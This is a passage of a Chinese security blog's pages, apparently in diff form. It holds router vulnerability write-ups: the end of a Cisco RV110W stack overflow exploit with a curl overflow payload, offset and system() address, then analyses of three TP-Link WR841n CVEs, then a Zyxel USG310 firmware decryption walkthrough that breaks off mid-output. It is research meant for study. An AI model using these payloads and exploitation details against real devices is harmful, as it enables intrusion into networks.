+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -i -k -X POST https://10.10.10.1/login.cgi -d &#x27;submit_button=login&amp;submit_type=&amp;gui_action=&amp;default_login=1&amp;wait_time=0&amp;change_action=&amp;enc=1&amp;user=cisco&amp;pwd=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADDDDZZZZ&amp;sel_lang=EN&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>程序依旧会在strlen()函数处中断，并且传入的参数是”ZZZZ”。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119172907415.png" alt="image-20211119172907415"></p>
+<p>如果是构造 构造105*‘A’+DDDD 的话，执行到strlen处，获取到正确有效的地址。<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119173608437.png" alt="image-20211119173608437"></p>
+<p>最终可以劫持PC<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119173834064.png" alt="image-20211119173834064"></p>
+<h3 id="2）-计算偏移量"><a href="#2）-计算偏移量" class="headerlink" title="2） 计算偏移量"></a>2） 计算偏移量</h3><p>经过上面的劫持PC, valid_user()函数中局部变量acStack109 到$ra的偏移量是105，因此只需要填充105个字节就可以到达$ra返回地址</p>
+<h3 id="3）确定漏洞利用途径"><a href="#3）确定漏洞利用途径" class="headerlink" title="3）确定漏洞利用途径"></a>3）确定漏洞利用途径</h3><p>由于mips 架构的程序无法开启NX防护，因此接下来只需要寻找可用的gadgets.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">shayuhuajiao@ubuntu ~/i/g/_/s/u/sbin&gt; checksec httpd </span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">[*] &#x27;/home/shayuhuajiao/_RV110W_FW_1.2.1.7.bin.extracted/squashfs-root/usr/sbin/httpd&#x27;</span><br><span class="line">    Arch:     mips-32-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先使用vmmap 查看程序运行时加载的lib 库的情况和执行权限。这里我们可以确定&#x2F;lib&#x2F;libc.so.0是可以使用的。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210730101633714.png" alt="image-20210730101633714"></p>
+<p>使用 mipscrop.stackfinder() 找到合适的 gadget。</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210809144156630.png" alt="image-20210809144156630"></p>
+<p>寻找可以利用的system 函数和该函数的对Libc 中的偏移地址，然后根据libc 的基地址，就可以获取system的完整地址为 0x2af98000 + 0x0004C7E0 &#x3D; 0x2AFE47E0</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20210730102407081.png" alt="image-20210730102407081"></p>
+<p>找到可以使用的nop 地址<img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211124155554186.png" alt="image-20211124155554186"></p>
+<h3 id="4）-构造最终的ROP-Chain"><a href="#4）-构造最终的ROP-Chain" class="headerlink" title="4） 构造最终的ROP Chain"></a>4） 构造最终的ROP Chain</h3><p>最终构造的ROP chain 如下图所示</p>
+<p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211124162224979.png" alt="image-20211124162224979"></p>
+<h3 id="5-exploit-测试"><a href="#5-exploit-测试" class="headerlink" title="5)  exploit 测试"></a>5)  exploit 测试</h3><p><img src="/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/image-20211119181424341.png" alt="image-20211119181424341"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/15/Cisco_RV110W_%E5%A0%86%E6%A0%88%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" data-id="clq9l1r3q0002ysvbcwhpeica" data-title="Cisco_RV110W_堆栈缓冲区溢出漏洞分析和利用" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-TP-Link_WR841n_路由器漏洞复现" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T14:52:18.822Z" itemprop="datePublished">2023-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">TP-Link WR841n 路由器多个缓冲区溢出漏洞复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="TP-Link-WR841n-路由器多个缓冲区溢出漏洞复现"><a href="#TP-Link-WR841n-路由器多个缓冲区溢出漏洞复现" class="headerlink" title="TP-Link WR841n 路由器多个缓冲区溢出漏洞复现"></a>TP-Link WR841n 路由器多个缓冲区溢出漏洞复现</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>最近看到了关于TP-Link 一个古老的路由器 WR841n 的漏洞披露文章，都是关于缓冲区溢出的漏洞，虽然设备老，但是漏洞的发现过程都挺有学习价值的。在平时对设备的漏洞挖掘过程中，可能会比较倾向于对设备的工作流程进行分析，然后逆向一些关键的函数和代码，在这些代码和函数中，找到可能存在的漏洞函数，拿缓冲区溢出漏洞来说，会分析strcpy、sprintf 、strcat、gets 诸如此类的函数，查看局部变量在拷贝字符串的时候是否对字符串的长度进行限制。但是比较少的对通过指针或者地址的拷贝字符串的方式进行分析，通过指针拷贝字符串也经常的会出现缓冲区溢出漏洞。接下来我将WR841n 设备中存在的三个缓冲区溢出的漏洞进行分析，记录，整理。所以这是一篇学习记录的文章。漏洞的披露链接在参考章节。</p>
+<h2 id="0x02-http流程分析"><a href="#0x02-http流程分析" class="headerlink" title="0x02 http流程分析"></a>0x02 http流程分析</h2><p>固件版本:  <a target="_blank" rel="noopener" href="https://www.tp-link.com/vn/support/download/tl-wr841n/v10/#Firmware">3.16.9 Build 150310</a></p>
+<p>首先通过main 函数调用httpd() 和 httpBasicRpmInit() 函数对设备的http服务进行初始化，这个函数会将设备的一些功能进行初始化，并且路由器的相关http 功能处理的函数在这个函数中进行配置，初始化。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904161544218.png" alt="image-20220904161544218"></p>
+<p>在httpd() 函数初始化的时候，会创建httpServerCreate()函数，来用以创建http Server，</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904162043597.png" alt="image-20220904162043597"></p>
+<p>在经过 httpServerCreate() –&gt;sub_4F5CD0 –&gt; httpDispatcher() 之后。会经过httpDispatcher()函数，这个函数会处理为各个不同的url 调用httpGenListFuncGet()函数进行函数注册绑定，以保证传入的request 请求数据包中的url 有对应的注册函数进行处理传入的对应数据包。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904162237720.png" alt="image-20220904162237720"></p>
+<p>最终httpRpmConfAdd  函数会获取 request_url 对应的函数指针，然后调用函数。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904163152435.png" alt="image-20220904163152435"></p>
+<p>具体的使用方式如httpPingIframeInit()函数。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220904162924650.png" alt="image-20220904162924650"></p>
+<h2 id="0x03-第一个漏洞分析CVE-2020-8423"><a href="#0x03-第一个漏洞分析CVE-2020-8423" class="headerlink" title="0x03 第一个漏洞分析CVE-2020-8423"></a>0x03 第一个漏洞分析CVE-2020-8423</h2><p>接下来分析WR841n 中的三个漏洞</p>
+<p>首先来看一下CVE-2020-8423，vulnerability function stringModify()，这个函数是于转义一些字符的。当我们输入字符中有 “&#x2F;“ ，”&gt;”，”\\“，”&lt;” ，’ &quot; ‘ 时，会在当前字符前面添加一个”\“ ，这一块的处理代码在line23~ line 44 。如果当前的字符是 “&#x2F;“ , 那么字line 30 会*a1 指针指向的值是 “\“，然后在line 33 ，a1 的指针就会加1 指向下一个内存地址。接着到达line 42，这一行会给a1 现在的地址指向的值复制为 当前的字符 “&#x2F;“，因为现在的a1 指针的地址是之前已经加1 了，所以内存中的字符应该是 “/“。</p>
+<p>接下来在line 53 还会获取当前字符下一个字符，然后判断这个字符是否是 “\n” 并且还要是 “\r” ，否则就会在内存中添加 “&lt;br&gt;”，然后指针往后移4个地址。感觉这一段很有问题，因为一个字符没办法同时等于两种不同的字符，所以最终肯定会走到这里。QAQ</p>
+<p>因此只需要传入的字符是”&#x2F;\n” 那么就会变成 “/&lt;br&gt;”，比原先多了四个字节。然后a1的大小设置是512个字节，因此当经过这个函数之后，如果我们传入512个这种字符串，就会比原先多2048个字节，从而造成buffer overflow 。</p>
+<p>stringModify()</p>
+<p>该函数在遇到字符\、&#x2F;、&lt;、&gt;”时添加字符\，或者如果下一个字符不是\n和\r，则添加&lt;br&gt;，当缓冲区满时进程将停止。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902223305823.png" alt="image-20220902223305823"></p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902231606005.png" alt="image-20220902231606005"></p>
+<p>现在我们要考虑是的stringModify() 那里会被调用并可以传入字符串，查看交叉引用可以看到writepageParamSet()函数在调用。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902232740116.png" alt="image-20220902232740116"></p>
+<p>然后继续查看writepageParamSet() 函数的交叉引用，可以看到在sub_45FA94() line 308 中传入v53 变量中的字符串。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220830155645198.png" alt="image-20220830155645198"></p>
+<p>在这个函数的line 240 会获取ssid 的值。然后将值复制给v53。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902233425566.png" alt="image-20220902233425566"></p>
+<h2 id="0x04-第二个漏洞分析-CVE-2022-30024"><a href="#0x04-第二个漏洞分析-CVE-2022-30024" class="headerlink" title="0x04 第二个漏洞分析  CVE-2022-30024"></a>0x04 第二个漏洞分析  CVE-2022-30024</h2><p>这个产生的原因 isAddrDispose()在处理ping_addr 的时候对ping value 长度的限制设置并没有起到效果，这种问题在缓冲区溢出中是很常见的，我们可以看到在 line28 行会对 ping value 的调用strlen 进行计算长度。这个长度的大小在于我们输入value 的大小而确定的，比如我输入一千多个字符，那么这个len_ping_addr 长度就是一千。</p>
+<p>这就造成了在line 35 中并没有起到对输入字符长度起到任何的作用。在line 32~line 40 中是将ping value 的字符逐个传递给v23局部变量，而v23 定义的数据大小仅仅为52个字节 。因此会造成又一个buffer overflow </p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220830171410260.png" alt="image-20220830171410260"></p>
+<p>这个函数会在sub_44A530() 中进行处理。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902220743030.png" alt="image-20220902220743030"></p>
+<p>当请求的url中是“ &#x2F;userRpm&#x2F;PingIframeRpm.htm ” 时，httpGetEnv() 会获取ping_addr 的value 。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902220913276.png" alt="image-20220902220913276"></p>
+<p>然后回调用 isAddrDispose() 函数来处理 ping_addr 的value，也就是我们前面分析过程了。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902221016715.png" alt="image-20220902221016715"></p>
+<h2 id="0x05-第三个漏洞分析-CVE-2022-24355"><a href="#0x05-第三个漏洞分析-CVE-2022-24355" class="headerlink" title="0x05 第三个漏洞分析 CVE-2022-24355"></a>0x05 第三个漏洞分析 CVE-2022-24355</h2><p>前面我们知道了httpRpmConfAdd 函数会根据请求数据包的url 中的路径来确定调用相应的注册函数，在httpd初始化的时候，会把httpRpmFS() 函数和 url 的字符串”&#x2F;loginFs&#x2F;“,”&#x2F;fs&#x2F;“ 进行绑定并注册函数。接下来分析httpRmpFs函数是如何处理请求URL 中带有”&#x2F;loginFs&#x2F;“ 的数据包。 </p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220901231622196.png" alt="image-20220901231622196"></p>
+<p>首先会函数的形参a1 是获取到的请求数据包，然后回获取到数据包的header 信息以及数据包的中的url，然后和&#x2F;tmp&#x2F;或者&#x2F;web&#x2F;文件路径进行拼接，判断是否是这两个文件夹中的文件，在判断的过程中，还做了过滤“..” ，以免请求的文件url 存在路径穿越的漏洞。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902214447028.png" alt="image-20220902214447028"></p>
+<p>接下来程序会走到sub_4EE210函数中。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220901231346583.png" alt="image-20220901231346583"></p>
+<p>我们来到函数sub_4EE2210() 中，这个本来是为了提取文件后缀的。但是由于首先会判断v2 的值是为空。我们知道v2 的值是 &#x2F;tmp&#x2F;loginfs&#x2F;passwd ，接下来在line 21 获取文件路径的指针，然后一直往指针在往低地址移动，匹配是否有 “.” 。找到了之后就会把 “.” 字符的下一个字符地址赋给v4。其实由于file_path 中是passwd ，因此没有 “ . “ 字符，因此会继续移动指针，会导致指针移动到 header 中 referer 中的 url中的 “.”。因此会获取referer 中“.” 的下一个指针地址给v4。并且在line28 的循环中将后面的每个字符进行转成大写字母，然后写入到file_extension 从而造成了 buffer overflow。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902000054726.png" alt="image-20220902000054726"></p>
+<h2 id="0x06-疑似漏洞"><a href="#0x06-疑似漏洞" class="headerlink" title="0x06 疑似漏洞"></a>0x06 疑似漏洞</h2><p>在分析前面的漏洞的时候，看到获取ssid 的值，这一段代码中，strncpy 函数会造成缓冲区溢出的漏洞，因为在v22 将ssid 的值复制给v53 的过程中，复制的字符串的长度是由v21 进行设置的，而v21 字符的数量恰好是我们可以输入的。因此复制给v53的字符串我们可以自己控制，当输入的字符串长度超过了局部变量v53 分配的内存大小的收，就会造成缓冲区溢出的漏洞，和前面CVE-2022-30024 中ping_addr 是一样的。由于手头上没有这一款设备，因此如果有设备的师傅，希望能帮忙验证一下。</p>
+<p><img src="/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%90%88%E9%9B%86.assets/image-20220902234353910.png" alt="image-20220902234353910"></p>
+<h2 id="0x07-总结"><a href="#0x07-总结" class="headerlink" title="0x07 总结"></a>0x07 总结</h2><p>这三个漏洞的成因都是通过在指针拷贝和处理字符串的时候，并没有考虑内存的问题，比如CVE-2020-8423 漏洞在转义字符的之后，并没有对转义后的字符串进行长度的限制。在CVE-2022-3024漏洞中，ping_addr的长度限制没有固定，反而是由传入的参数进行计算。</p>
+<h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a target="_blank" rel="noopener" href="https://blog.viettelcybersecurity.com/1day-to-0day-on-tl-link-tl-wr841n/">https://blog.viettelcybersecurity.com/1day-to-0day-on-tl-link-tl-wr841n/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/">https://blog.viettelcybersecurity.com/tp-link-tl-wr940n-httpd-httprpmfs-stack-based-buffer-overflow-remote-code-execution-vulnerability/</a></p>
+<p>C program 通过指针复制字符串</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1687616">https://cloud.tencent.com/developer/article/1687616</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://tig3rhu.github.io/2023/12/15/TP-Link_WR841n_%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" data-id="clq9l1r3x0009ysvbgqm37lay" data-title="TP-Link WR841n 路由器多个缓冲区溢出漏洞复现" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-USG310_4.70_固件解密分析" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/" class="article-date">
+  <time class="dt-published" datetime="2023-12-15T14:47:02.978Z" itemprop="datePublished">2023-12-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/12/15/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90/">USG310_4.70_固件解密分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="USG310-4-70-固件解密分析"><a href="#USG310-4-70-固件解密分析" class="headerlink" title="USG310_4.70_固件解密分析"></a>USG310_4.70_固件解密分析</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>关于Zyxel 固件的解密和提取的分析，最近的这篇文章给了我一个很好的idea，感兴趣的可以去看一下。</p>
+<p>文章连接：<a target="_blank" rel="noopener" href="https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/">https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/</a></p>
+<p>对固件进行漏洞挖掘的第一步，就是从固件中提取我们需要的一些文件和组件，从而进行漏洞分析，但是如果解开固件包的过程中，显示固件已被加密，并且无法确定如何进行解密，那么是特别难受的。从一些常见的固件解密的方式来看，有的固件是压缩的时候进行加密的，那么解密程序或者生成解密密钥的二进制文件有可能会存在和固件包一起的打包出来，那么可以根据确定一些与解密有关的关键信息，和逆向加密算法对加密方式进行对应的破解，但是，i am lazy :) 。 所以通过收集固件的信息，了解其中的加密的一些命令和方式，比如zyxel固件解密所描述，根据一些特殊的组件猜测其解密的方式，尝试去解密固件，虽然这个过程也很艰难，但相对去逆向晦涩难懂的加密算法而言，难度就小很多了。</p>
+<p>另外也可以根据linux中常见的解密工具，比如unzip 来确定固件中的解密方式，如下图所示的这个案例，通过检索unzip信息，获取到了解密的方式和解密密钥。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531223826053.png" alt="image-20220531223826053"></p>
+<p>接下来我来讲述一下关于Zyxel 固件的另一种固件解密的idea,  虽然在固件解密这一块，也并不怎么擅长，但仍希望能给大家带来不一样的想法。</p>
+<h2 id="0x02-固件解包-1"><a href="#0x02-固件解包-1" class="headerlink" title="0x02  固件解包 1"></a>0x02  固件解包 1</h2><p>固件版本：USG310 4.70</p>
+<p>固件下载连接： <a target="_blank" rel="noopener" href="https://firmware.cdn.cloud.zyxel.com/firmware/AAPJ/4.72(AAPJ.0)/firmware.zip">https://firmware.cdn.cloud.zyxel.com/firmware/AAPJ/4.72(AAPJ.0)/firmware.zip</a></p>
+<p>固件指令架构： ELF 32-bit MSB executable, MIPS, N32 MIPS64 rel2 version 1 (SYSV), statically linked, stripped</p>
+<p>这里我使用的是 firmware_USG310_4.70(APPJ.0) 固件包， 下载下来之后，这是一个zip 压缩的压缩文件，解压之后的目录如下所示</p>
+<p>后的目录如下所示</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531232958486.png" alt="image-20220531232958486"></p>
+<p>我们要解开的固件是 470AAPJ0C0.bin , 使用zip 查看 470AAPJ0C0.bin。 </p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531094424948.png" alt="image-20220531094424948"></p>
+<p>同时使用zip 解压提取固件包的时候，显示是需要密码的。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531233318654-1654092293991.png" alt="image-20220531233318654"></p>
+<p>但是在 db\etc\zyxel\ftp\conf\目录中，看到了system-defalut.conf 文件，这个文件的大小为 72871和 470AAJ0C0.conf  文件 (72870) 的大小只相差1字节。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220531233643518-1654092293991.png" alt="image-20220531233643518"></p>
+<p>如此的巧合让我猜测这两个文件应该是同一个文件，我尝试使用pkcrack 明文攻击来破解，很遗憾，并没有达到我要的破解效果，甚至我在 470AAJ0C0.conf 文件中增加了一个字节，让这两个文件的大小相同，同样没有达到效果。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220601221345019.png" alt="image-20220601221345019"></p>
+<p>于是根据<a target="_blank" rel="noopener" href="https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/%EF%BC%8C%E6%88%91%E4%BD%BF%E7%94%A8binwalk">https://security.humanativaspa.it/zyxel-firmware-extraction-and-password-analysis/，我使用binwalk</a> 解开470AAJ0C0.ri 文件。</p>
+<p><img src="/USG310_4.70_%E5%9B%BA%E4%BB%B6%E8%A7%A3%E5%AF%86%E5%88%86%E6%9E%90.assets/image-20220530230602516-1654092293991.png" alt="image-20220530230602516"></p>
+<p>接着使用binwalk 解开 _470AAPJ0C0 文件中的240 文件。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">tigerortiger@ubuntu ~/i/g/z/firmware_USG310_4.70&gt; cd _470AAPJ0C0.ri.extracted/</span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_470AAPJ0C0.ri.extracted&gt; ls</span><br><span class="line">240  240.7z</span><br><span class="line">tigerortiger@ubuntu ~/i/g/z/f/_470AAPJ0C0.ri.extracted&gt; binwalk -e 240</span><br><span class="line"></span><br><span class="line">DECIMAL       HEXADECIMAL     DESCRIPTION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">0             0x0             ELF, 64-bit MSB MIPS32 rel2 executable, MIPS, version 1 (SYSV)</span><br><span class="line">5107864       0x4DF098        Linux kernel version 3.10.8</span><br><span class="line">5179656       0x4F0908        gzip compressed data, maximum compression, from Unix, last modified: 1970-01-01 00:00:00 (null date)</span><br><span class="line">5196240       0x4F49D0        Unix path: /home/sdd1/buildbot/470-share1100-k3-slave/470-share1100-k3/build/share1100-r102127-k3/share1100/src/kernel</span><br><span class="line">5284016       0x50A0B0        DES SP2, big endian</span><br><span class="line">5284528       0x50A2B0        DES SP1, big endian</span><br><span class="line">5824472       0x58DFD8        Unix path: /usr/bin/magic-seed</span><br><span class="line">5853384       0x5950C8        Unix path: /home/sdd1/buildbot/470-share1100-k3-slave/470-share1100-k3/build/share1100-r102127-k3/share1100/src/kernel/arch/mips/include/as</span><br><span class="line">5939112       0x5A9FA8        xz compressed data</span><br><span class="line">6040223       0x5C2A9F        Copyright string: &quot;Copyright 2005-2007 Rodolfo Giometti &lt;giometti@linux.it&gt;&quot;</span><br><span class="line">6092400       0x5CF670        Neighborly text, &quot;NeighborSolicits&quot;</span><br><span class="line">6092424       0x5CF688        Neighborly text, &quot;NeighborAdvertisementsorts&quot;</span><br><span class="line">6097330       0x5D09B2        Neighborly text, &quot;neighbor %.2x%.2x.%pM lost rename link %s to %s&quot;</span><br><span class="line">6463872       0x62A180        CRC32 polynomial table, little endian</span><br><span class="line">6643248       0x655E30        Unix path: /usr/local/zld_udev/sbin/uevent_helper.sh</span><br><span class="line">7060288       0x6BBB40        Flattened device tree, size: 7847 bytes, version: 17</span><br><span class="line">7068160       0x6BDA00        Flattened device 